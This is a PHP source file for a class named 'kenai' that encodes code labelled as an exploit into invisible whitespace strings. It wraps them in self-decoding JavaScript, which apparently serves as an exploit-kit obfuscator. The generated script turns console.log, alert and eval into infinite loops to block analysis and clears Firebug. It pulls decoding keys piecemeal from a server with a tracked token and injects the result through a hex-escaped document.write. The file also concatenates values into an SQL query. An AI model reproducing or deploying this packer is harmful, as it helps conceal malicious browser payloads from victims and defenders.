<?php 

/*
 * VERSION: Drama Queen - 4
 * Changes:
 * - Refactored functions and overall class
 * - Restructured output JavaScript
 * - Added in more verbose comments so the code were easily followed
 */
class kenai {
	
	var $ascii_reverse = false;
	var $splitter = "";
	var $random_shift = 0;
	var $alpha_key = "";
	var $invisble_key = "";
	var $invisible_alpha = "";
	var $shared_console = ""; 
	var $final_encode = "";
	
	/*
	 * Pick random values for everything
	 */
	public function kenai() {
//		$this->splitter = "   ";
//		$this->final_encode = chr(9).chr(11).chr(12); //final encode can't include the splitter, so must check
		$this->set_changers();
	}
	
	function set_changers() {
		$valid_encodes = array(chr(9),chr(11),chr(12),chr(32),"!","@","#","$","%","^","&","*","(",")","~","-","+","=",".",">","<","/","`","?",":",";");
		$split = $valid_encodes[rand(0,3)]; //splitter should always be all 9, 11, 12 or 32
		$this->splitter = $split.$split.$split;
		
		$out = '';
		unset($valid_encodes[array_search($split,$valid_encodes)]); //remove the split
		$valid_encodes = array_values($valid_encodes);
		for($i=0;$i<3;$i++) {
			$val = $valid_encodes[rand(0,count($valid_encodes)-1)];
			$out .= $val;
			unset($valid_encodes[array_search($val,$valid_encodes)]);
			$valid_encodes = array_values($valid_encodes);
		}
		
		$this->final_encode = $out;
	}
	
	/*
	 * Function get_random_string_array
	 * Returns array full of unique random strings look very similar
	 */
	public function get_random_string_array($len,$c) {
		$thanksgiving = array(); //begin the prep
		$stuffing = str_shuffle("abcdefghijklmnopqrstuvwxyz"); //no need to case, avoid int so we dont break JS
		$turkey = "";
		for ($a = 0; $a <= 100; $a++) { //100 isn't that big, but good enough
			$split_decision = rand(0,100); //controls the casing
			if($split_decision > 50) {
				$gravy = strtoupper($stuffing[0]);
			} else {
				$gravy = $stuffing[0];
			}
			$turkey .= $gravy;
		 }
		 
		 for($b = 0; $b <= $c + 5; $b++) { //everyone overeats so we add 5
		 	$serving_size = substr($turkey,rand(1,24),rand(30,90)); //time to carve
		 	$thanksgiving[] = $serving_size;
		 }
	 
		 return array_values(array_unique($thanksgiving)); //dinner is served
	}
	
	/*
	 * Function speak_to_three
	 * Returns permutations of a string
	 * Note - only pass three chars with all of them unique
	 */
	function speak_to_three($str) { //better be 3
		$permutate_arr = array();
		$char_arr = array();
		
		for($i=0;$i<strlen($str);$i++)
			$char_arr[] = $str{$i};
		
		//ugly, yet beautiful at the same time
		foreach ($char_arr as $x)
			foreach ($char_arr as $y)
				foreach ($char_arr as $z)
		      		$permutate_arr[] = $x . $y . $z;
		      
	    return $permutate_arr; //3^3 is 27, we need 26
	}
	
	/*
	 * Function ascii2code
	 * Take in original code and turn it into asicc numbers
	 * OUT: 594139111108108101104394011611410110897
	 */
	public function ascii2code($code) {
		$res = Array();
		$i = strlen($code);
		for ($a=0;$a<$i;$a++) {
			$csnc = ord($code[$a]);
			$csnc = $csnc - $this->randon_shift;
			$res[] = $csnc;	
		}
		if($this->ascii_reverse) {
			$res = array_reverse($res);
		}

		$out = join($this->get_splitter(), $res);
		return $out;
	}
	
	/*
	 * Function code2char
	 * Take in the ascii numbers and map them to a random alpha key, but keep the splits from ascii2code
	 * IN: 594139111108108101104394011611410110897
	 * OUT: gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
	 */
	public function code2char($code) {
		$this->alpha_key = str_shuffle("abcdefghijklmnopqrstuvwxyz");
		$out = "";
		for($i=0;$i < strlen($code); $i++) {
			if(is_numeric($code[$i])) {
				$out .= $this->alpha_key[$code[$i]];
			} else { //hit those blank splitters
				$out .= $code[$i];
			}
		}
		return $out;
	}
	
	/*
	 * Function make_invisble
	 * Take in ASCII string and map it to the invisible key
	 * IN: gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
	 * OUT: <invisible>
	 */
	public function make_invisble($code) {
		$this->gen_invisible_key(); //make the key first
		$out = "";
		for($i=0;$i < strlen($code); $i++) {
			if(ctype_alpha($code[$i])) {
				$out .= $this->invisble_key[$code[$i]]; //produces 2 chars and not 1
			} else { //hit those blank splitters
				$out .= $code[$i];
			}
		}
		return $out;		
	}
	
	/*
	 * Generate an invisible key that will convert numbers to blanks
	 */
	public function gen_invisible_key() {
		$key = Array();
		$tmp = Array();
		$sender = $this->final_encode;
		$blanks = $this->speak_to_three($sender);
		$alpha = "abcdefghijklmnopqrstuvwxyz";
		for($i=1;$i<=count($blanks);$i++) {
			$tmp[] = $blanks[$i-1];
			$key[$alpha[$i-1]] = $blanks[$i-1];
		}
		$this->invisible_alpha = join($this->get_splitter(),$tmp);
		$keys = array_keys( $key ); 
		shuffle( $keys );
		$this->invisble_key = array_merge( array_flip( $keys ) , $key ); //shuffle values ONLY to avoid the same ordering
	}
	
	/*
	 * Use all the functions to build the invisble payload
	 */
	public function crypt($orig_code) {
		$crypt_one = $this->ascii2code($orig_code); //594139111108108101104394011611410110897
		$crypt_two = $this->code2char($crypt_one); //gmcovmoooojbojbojoojcvmcjoosoocojoojbmx
		$crypt_three = $this->make_invisble($crypt_two);
		return $crypt_three;
	}
	
	public function gen_detour() {
		$alpha = "abcdefghijklmnopqrstuvwxyz";
		$seed = rand(50,150);
		$char = $alpha[50-rand(26,45)];
		for($i=0;$i < $seed; $i++ ) {
			$shell = rand(48,122);
			$out .= strtoupper($char) . $shell;
		}
		return $out;
	}
	
	public function save_token($alpha,$exp_count) {
		global $link;
		$seed_token = hash("sha1",str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"));
		$query = "insert into seed_tokens (seed,alpha,count) values ('".$seed_token."', '".$alpha."',$exp_count)";
		$results = mysqli_query($link,$query);
		@mysqli_free_result($results);
		return $seed_token;
	}
	
	public function get_alpha_key() {
		return $this->alpha_key;
	}
	
	public function get_invisible_alpha() {
		return $this->invisible_alpha;
	}
	
	public function get_shared_console() {
		return $this->shared_console;	
	}
	
	public function get_splitter() {
		return $this->splitter;
	}
	
	public function get_final_encode() {
		return $this->final_encode;
	}
	
	public function lesda_encoder($code) {
	    $rnd_nm_crypt = $this->get_random_string_array(rand(30, 100), 50);
        $exploit = $this->crypt($code);
	    $invis_key = $this->get_invisible_alpha();
	    $alpha_key = $this->get_alpha_key();
    	$exp_count = (strlen($exploit)) /3;
    	$seed_token = $this->save_token($alpha_key,$exp_count);
	    $split = $this->get_splitter();
    	$this->shared_console = $rnd_nm_crypt[20];
	    
	    $payload = "";
    	$payload .= "try {";
	    $payload .= "$();";
	    $payload .= "(function() {"; //create anonymous function
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';";
		$payload .= "if(window.console) {";
		$payload .= "console = { log: function() { while(true) {} } };"; //hook console.log()
		$payload .= "alert = function() { while(true) {} };"; //hook alert();
		$payload .= "}";
		$payload .= "eval = function() { while(true) {} };"; //hook eval();
		$payload .= "})();"; //execute self and hoist
		$payload .= "if(!Array.indexOf){Array.prototype.indexOf = function(obj){for(var i=0; i<this.length; i++){if(this[i]==obj){return i;}}return -1;}}"; //please die IE
	    $payload .= "abcdefghijklmnopqrstuvwxyz = '" . $this->gen_detour() . "';"; //abc table and fake shell
	    $payload .= "$rnd_nm_crypt[1]='$invis_key';"; //invis key 
	    $payload .= "$rnd_nm_crypt[2]='$exploit';"; //payload
	    $payload .= "$rnd_nm_crypt[4] = 'abcdefghijklmnopqrstuvwxyz';";
	    $payload .= "$rnd_nm_crypt[5] = '$split';";
	    $payload .= "var $rnd_nm_crypt[10] = '';";
	    $payload .= "for($rnd_nm_crypt[7]=0;$rnd_nm_crypt[7]<$rnd_nm_crypt[2].length-1;$rnd_nm_crypt[7]++){";
	    $payload .= "var $rnd_nm_crypt[14] = $rnd_nm_crypt[7] + 2;"; //add to the counter
	    $payload .= "var $rnd_nm_crypt[16] = $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7]) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 1) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 2);"; //bit string - should contain 3
	    $payload .= "if($rnd_nm_crypt[16] != $rnd_nm_crypt[5]) { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
	    $payload .= "try {";
	    $payload .= "$rnd_nm_crypt[10] += $.ajax({url:'fetch.php',type:'post',data:{'q':$rnd_nm_crypt[4].charAt($rnd_nm_crypt[1].split($rnd_nm_crypt[5]).indexOf($rnd_nm_crypt[16])),'s':'$seed_token' },async:false}).responseText.replace(/\"/g, '');";
    	$payload .= "} catch (e) {";
       	$payload .= "$rnd_nm_crypt[10] += Math.floor(Math.random()*11)";
    	$payload .= "}";
	    $payload .= "if($rnd_nm_crypt[20].firebug)$rnd_nm_crypt[20].clear();";
	    $payload .= "} else //{*/}{{{f}unc}ti{on(}){}}*/ \n"; //ends if
		$payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[16];"; //ADD IN THE SPLITTER
   	    $payload .= "$rnd_nm_crypt[7]=$rnd_nm_crypt[14];";
	    $payload .= "}"; //ends for
    	$payload .= "$rnd_nm_crypt[6] = $rnd_nm_crypt[10].split($rnd_nm_crypt[5]);";
	    $payload .= "for($rnd_nm_crypt[17]=0;$rnd_nm_crypt[17]<$rnd_nm_crypt[6].length;$rnd_nm_crypt[17]++){";
	   	$payload .= "$rnd_nm_crypt[15] += String.fromCharCode($rnd_nm_crypt[6][$rnd_nm_crypt[17]]);";
	    $payload .= "}";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('<scri'+'pt>');";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']($rnd_nm_crypt[15]);";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('</scri'+'pt>');";
//		$payload .= "$rnd_nm_crypt[15]";
		$payload .= "} catch(e) {";
		$payload .= "var $rnd_nm_crypt[21] =  Math.floor(Math.random()*11)";
		$payload .= "}";
	    
		return $payload;
	}
	
	public function hilma_encoder($code) {
	    $rnd_nm_crypt = $this->get_random_string_array(rand(30, 100), 50);
    	$console = $this->shared_console;
       	$exploit = $this->crypt($code);
	    $invis_key = $this->get_invisible_alpha();
	    $alpha_key = $this->get_alpha_key();
   	    $split = $this->get_splitter();
   	    $detour = $this->gen_detour();
   	    
	    $payload = "";
//	    $payload .= "function one() {";
	    $payload .= "try {";
	    $payload .= "$();";
    	$payload .= "(function() {"; //create anonymous function
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';$console = '';";
		$payload .= "if(window.console) {";
		$payload .= "$console = console;";
		$payload .= "console = { log: function() { while(true) {} } };"; //hook console.log()
		$payload .= "alert = function() { while(true) {} };"; //hook alert();
		$payload .= "}";
		$payload .= "eval = function() { while(true) {} };"; //hook eval();
		$payload .= "})();"; //execute self and hoist
		$payload .= "if(!Array.indexOf){Array.prototype.indexOf = function(obj){for(var i=0; i<this.length; i++){if(this[i]==obj){return i;}}return -1;}}"; //please die IE
		$payload .= "$rnd_nm_crypt[19] = document;$rnd_nm_crypt[15] = '';";
	    $payload .= "$rnd_nm_crypt[0]='$alpha_key';"; //alpha key
	    $payload .= "abcdefghijklmnopqrstuvwxyz = '$detour';"; //abc table and fake shell
	    $payload .= "$rnd_nm_crypt[1]='$invis_key';"; //invis key 
	    $payload .= "$rnd_nm_crypt[2]='$exploit';"; //payload
	    $payload .= "$rnd_nm_crypt[4] = 'abcdefghijklmnopqrstuvwxyz';";
	    $payload .= "$rnd_nm_crypt[5] = '$split';";
	    $payload .= "var $rnd_nm_crypt[10] = '';";
	    $payload .= "for($rnd_nm_crypt[7]=0;$rnd_nm_crypt[7]<$rnd_nm_crypt[2].length-1;$rnd_nm_crypt[7]++){";
	    $payload .= "var $rnd_nm_crypt[14] = $rnd_nm_crypt[7] + 2;"; //add to the counter
	    $payload .= "var $rnd_nm_crypt[16] = $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7]) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 1) + $rnd_nm_crypt[2].charAt($rnd_nm_crypt[7] + 2);"; //bit string - should contain 3
	    $payload .= "if($rnd_nm_crypt[16] != $rnd_nm_crypt[5]) { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
		$payload .= "var $rnd_nm_crypt[11]=$rnd_nm_crypt[1].split($rnd_nm_crypt[5]);";
		$payload .= "var $rnd_nm_crypt[12]=$rnd_nm_crypt[11].indexOf($rnd_nm_crypt[16]);";
		$payload .= "var $rnd_nm_crypt[13]=$rnd_nm_crypt[4].charAt($rnd_nm_crypt[12]);";
	    $payload .= "try {";
	    $payload .= "$();";
	    $payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[0].indexOf($rnd_nm_crypt[13]);";
       	$payload .= "} catch (e) {";
       	$payload .= "$rnd_nm_crypt[10] += Math.floor(Math.random()*11)";
    	$payload .= "}";
    	$payload .= "} else { //{*/}{{{f}unc}ti{on(}){}}*/ \n"; //ends if
		$payload .= "$rnd_nm_crypt[10] += $rnd_nm_crypt[16];"; //ADD IN THE SPLITTER
    	$payload .= "}"; //ends if
   	    $payload .= "$rnd_nm_crypt[7]=$rnd_nm_crypt[14];";
	    $payload .= "}"; //ends for
    	$payload .= "$rnd_nm_crypt[6] = $rnd_nm_crypt[10].split($rnd_nm_crypt[5]);";
	    $payload .= "for($rnd_nm_crypt[17]=0;$rnd_nm_crypt[17]<$rnd_nm_crypt[6].length;$rnd_nm_crypt[17]++){";
	   	$payload .= "$rnd_nm_crypt[15] += String.fromCharCode($rnd_nm_crypt[6][$rnd_nm_crypt[17]]);";
	    $payload .= "};";
	    $payload .= "try { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
	    $payload .= "call(); } catch(e) { //{*/}{{{f}unc}ti{on(}){}}*/ \n";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('<scri'+'pt>');";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']($rnd_nm_crypt[15]);";
		$payload .= "$rnd_nm_crypt[19]['\x77\x72\x69\x74\x65']('</scri'+'pt>');";
		$payload .= "}";
		$payload .= "} catch(e) {";
		$payload .= "var $rnd_nm_crypt[21] =  Math.floor(Math.random()*11)";
		$payload .= "}";
//		$payload .= "}";
	    
		return $payload;
	}
}
?>
